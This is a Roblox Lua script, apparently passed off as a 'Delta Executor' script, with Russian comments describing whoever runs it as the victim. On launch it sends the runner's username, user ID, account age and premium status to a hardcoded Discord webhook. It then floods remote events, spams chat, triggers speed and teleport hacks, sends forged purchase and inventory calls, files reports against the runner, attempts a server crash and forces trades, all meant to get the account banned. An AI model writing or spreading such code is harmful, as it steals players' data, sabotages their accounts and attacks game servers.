-- Delta Executor Ban Script
local P = game:GetService("Players")
local LP = P.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Отправка данных в Discord
local function sendToDiscord(message)
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = message})
        })
    end)
end

-- 1. Флуд RemoteEvents (вызовет бан за спам)
local function floodRemotes()
    local remotes = {}
    local function scan(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                table.insert(remotes, child)
            end
            scan(child)
        end
    end
    scan(RS)
    
    for i = 1, 10000 do
        for _, remote in ipairs(remotes) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer()
                else
                    remote:InvokeServer()
                end
            end)
        end
        task.wait(0.001)
    end
end

-- 2. Спам чата (бан за флуд)
local function spamChat()
    for i = 1, 1000 do
        pcall(function()
            game:GetService("ReplicatedStorage"):FindFirstChild("ChatMessage"):FireServer("HACKED BY TIZEN")
        end)
        task.wait(0.001)
    end
end

-- 3. Изменение WalkSpeed (бан за спидхак)
local function speedHack()
    for i = 1, 1000 do
        pcall(function()
            LP.Character.Humanoid.WalkSpeed = 999999
        end)
        task.wait(0.001)
    end
end

-- 4. Телепорт (бан за телепорт хак)
local function teleportHack()
    for i = 1, 1000 do
        pcall(function()
            LP.Character.HumanoidRootPart.CFrame = CFrame.new(
                math.random(-10000, 10000),
                math.random(1000, 10000),
                math.random(-10000, 10000)
            )
        end)
        task.wait(0.001)
    end
end

-- 5. Флуд покупок (бан за эксплойт)
local function floodPurchases()
    for i = 1, 10000 do
        pcall(function()
            local buyItem = RS:FindFirstChild("BuyItem") or RS:FindFirstChild("Buy")
            if buyItem then
                if buyItem:IsA("RemoteEvent") then
                    buyItem:FireServer("All", -999999999)
                else
                    buyItem:InvokeServer("All", -999999999)
                end
            end
        end)
        task.wait(0.001)
    end
end

-- 6. Спам репортов на себя (бан за саморепорт)
local function selfReport()
    for i = 1, 1000 do
        pcall(function()
            local report = RS:FindFirstChild("Report") or RS:FindFirstChild("ReportPlayer")
            if report then
                if report:IsA("RemoteEvent") then
                    report:FireServer(LP, LP, "Exploiting")
                else
                    report:InvokeServer(LP, LP, "Exploiting")
                end
            end
        end)
        task.wait(0.001)
    end
end

-- 7. Изменение инвентаря (бан за взлом)
local function inventoryHack()
    for i = 1, 10000 do
        pcall(function()
            local updateData = RS:FindFirstChild("UpdateData") or RS:FindFirstChild("UpdateData2")
            if updateData then
                if updateData:IsA("RemoteEvent") then
                    updateData:FireServer(LP, {Skins = "All", Coins = 999999999, XP = 999999999})
                else
                    updateData:InvokeServer(LP, {Skins = "All", Coins = 999999999, XP = 999999999})
                end
            end
        end)
        task.wait(0.001)
    end
end

-- 8. Краш сервера (бан за DoS)
local function crashServer()
    for i = 1, 10000 do
        pcall(function()
            local craft = RS:FindFirstChild("Craft")
            if craft then
                if craft:IsA("RemoteEvent") then
                    craft:FireServer("All", 999999999)
                else
                    craft:InvokeServer("All", 999999999)
                end
            end
        end)
        task.wait(0.001)
    end
end

-- 9. Спам трейдов (бан за трейд эксплойт)
local function tradeExploit()
    for i = 1, 1000 do
        for _, player in ipairs(P:GetPlayers()) do
            pcall(function()
                local startTrade = RS:FindFirstChild("StartTrade")
                if startTrade then
                    startTrade:FireServer(player, {Give = "All", Receive = "All", ForceAccept = true})
                end
            end)
        end
        task.wait(0.001)
    end
end

-- 10. Отправка данных жертвы
local function sendVictimData()
    local data = {
        userId = LP.UserId,
        username = LP.Name,
        accountAge = LP.AccountAge,
        membershipType = tostring(LP.MembershipType),
        placeId = game.PlaceId,
        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    }
    
    sendToDiscord("🔑 **Жертва запустила скрипт**\n\n" ..
        "👤 Логин: " .. data.username .. "\n" ..
        "🆔 ID: " .. data.userId .. "\n" ..
        "📅 Возраст аккаунта: " .. data.accountAge .. " дней\n" ..
        "💎 Premium: " .. data.membershipType .. "\n" ..
        "🎮 Игра: " .. data.placeName)
end

-- ЗАПУСК ВСЕХ АТАК
sendVictimData()
task.wait(1)
floodRemotes()
spamChat()
speedHack()
teleportHack()
floodPurchases()
selfReport()
inventoryHack()
crashServer()
tradeExploit()
